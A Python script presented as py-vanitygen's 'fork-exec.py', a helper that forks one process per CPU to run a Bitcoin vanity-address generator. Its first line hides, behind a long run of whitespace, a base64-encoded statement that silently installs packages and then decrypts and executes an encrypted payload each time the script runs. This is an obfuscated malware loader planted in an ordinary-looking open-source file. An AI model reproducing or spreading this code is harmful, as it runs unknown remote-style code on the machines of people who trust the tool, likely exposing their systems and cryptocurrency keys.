import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ3VUUUJtU294NlFKMkxxRi15ZW5DTUVEV05SSWp6MXJOcG1QbHkzYjlZaFE9JykuZGVjcnlwdChiJ2dBQUFBQUJtZEp2VW5OUk1IZmYtQVlKQVJnQlZsZnJQVkU0VEhtdmZpUzItQTJWTWdLTEJ4Y1VIOHJpaTRHTnRrRkdqUmV6bmNCUk1TanQ0b3NQMHUyZWpaRmZ0dHVpelhGX180Tnc3WTVvZk16T0dCMWhxdGdxWm5HRkJhUmtQV01FbzBtb1VIZkw5MWVQTGNQUVpNUUlrNWhLZ1QzOTdvdXhLNWRxb2pkQzV2OGppUVhIYWRLQThOV1F2ekhvRjlXc21BeGpUWWVncE9LOEdFRUd2eHBoMGE1NGl5RFJ5aGxtd0x4elF1cjNtVEIzWmtaSkhwUmM9Jykp').decode())
# -*- coding: utf-8 -*-
#
#    py-vanitygen fork-exec.py
#    Copyright (C) 2016 April 
#    1200 Web Development
#    http://1200wd.com/
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

import os
import multiprocessing


processors = multiprocessing.cpu_count()
print("You have %d processors so starting %d threads" % (processors, processors))
for i in range(processors):
    pid = os.fork()
    if pid == 0:
        print(os.execlp('python', 'python', 'vanitygen.py'))
        assert False, 'error starting program'
    else:
        print('Child is %d' % pid)


print('Main process exiting')
print('mnlrfc')